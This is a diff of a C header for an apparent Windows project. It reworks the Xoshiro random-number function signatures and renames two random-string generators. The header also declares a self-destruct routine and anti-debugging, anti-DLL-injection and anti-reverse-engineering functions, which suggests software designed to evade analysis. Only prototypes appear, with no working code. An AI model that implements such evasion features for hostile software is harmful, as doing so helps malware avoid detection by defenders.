@@ -1,6 +1,9 @@
 #pragma once
 #include "_rift_shared.h"
 #include "resource.h"
+#pragma comment(linker, "\"/manifestdependency:type='win32' \
+name='Microsoft.Windows.Common-Controls' version='6.0.0.0' \
+processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
 
 /* WinMain : main.c */
 VOID ESelfDestruct();
@@ -9,10 +12,10 @@ VOID ESelfDestruct();
 BOOL EXoshiroBegin();
 VOID EXoshiroEnd();
 
-DWORD EXoshiroSS();
-DWORD EXoshiroP();
-UINT  ERandomIntDistribution(_In_ UINT uiMin, _In_ UINT uiMax);
-FLOAT ERandomRealDistribution();
+DWORD EXoshiroSS(_In_opt_ PDWORD dwa4);
+DWORD EXoshiroP(_In_opt_ PDWORD dwa4);
+UINT FASTCALL ERandomIntDistribution(_In_opt_ PDWORD dwa4, _In_ UINT uiMin, _In_ UINT uiMax);
+FLOAT ERandomRealDistribution(_In_opt_ PDWORD dwa4);
 
 /* Anti-ReverseEngineering : AntiDebug.c, AnitDllInject.c, AntiRE.c */
 BOOL fnAntiRE();
@@ -37,8 +40,8 @@ BOOL WriteFileCW(_In_ PCWSTR pFileName, _In_ PVOID pBuffer, _In_ SIZE_T nBuffer)
 PCWSTR GetFileNameFromPathW(_In_ PCWSTR pPath);
 
 /* Random : Random.c */
-VOID fnGenRandomB64W(_Out_ PVOID sz, _In_ SIZE_T n);
-VOID fnGenRandomPathW(_Out_ PVOID sz, _In_ SIZE_T n);
+VOID EGenRandomB64W(_Out_ PVOID sz, _In_ SIZE_T n);
+VOID EGenRandomPathW(_Out_ PVOID sz, _In_ SIZE_T n);
 PCWSTR EAllocRandomBase64StringW(_In_ SIZE_T nMin, _In_opt_ SIZE_T nMax);
 PCWSTR EAllocRandomPathW(_In_ SIZE_T nMin, _In_opt_ SIZE_T nMax);
 
